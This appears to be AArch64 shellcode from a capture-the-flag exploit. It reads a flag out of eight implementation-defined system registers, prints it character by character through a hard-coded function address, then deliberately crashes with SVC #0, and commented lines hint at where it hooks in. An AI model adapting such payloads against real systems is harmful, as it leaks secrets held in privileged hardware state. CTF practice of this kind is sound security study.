/*CMP X20, X1
B.NE do_smcv2
MOV X1, #22
B.EQ shellcode
B resume*/

shellcode:
MOV X0, SP
BL get_flag
MOV X12, X0

MOV X9, XZR
LDR X11, =0x401010A8
.print:
    ADD X0, X12, X9
    LDRB W1, [X0]

    // got null terminator?
    CMP W1, WZR
    B.EQ .done

    MOV W0, W1
    BLR X11
    ADD X9, X9, #1
B .print
.done:

// crash
SVC #0

NOP

get_flag:
  MRS X1, S3_3_C15_C12_0
  STR W1, [X0]
  MRS X1, S3_3_C15_C12_1
  STR W1, [X0,#4]
  MRS X1, S3_3_C15_C12_2
  STR W1, [X0,#8]
  MRS X1, S3_3_C15_C12_3
  STR W1, [X0,#12]
  MRS X1, S3_3_C15_C12_4
  STR W1, [X0,#16]
  MRS X1, S3_3_C15_C12_5
  STR W1, [X0,#20]
  MRS X1, S3_3_C15_C12_6
  STR W1, [X0,#24]
  MRS X1, S3_3_C15_C12_7
  STR W1, [X0,#28]
  RET

/*.offset 0x420
resume:
.offset 0x464
do_smcv2:*/
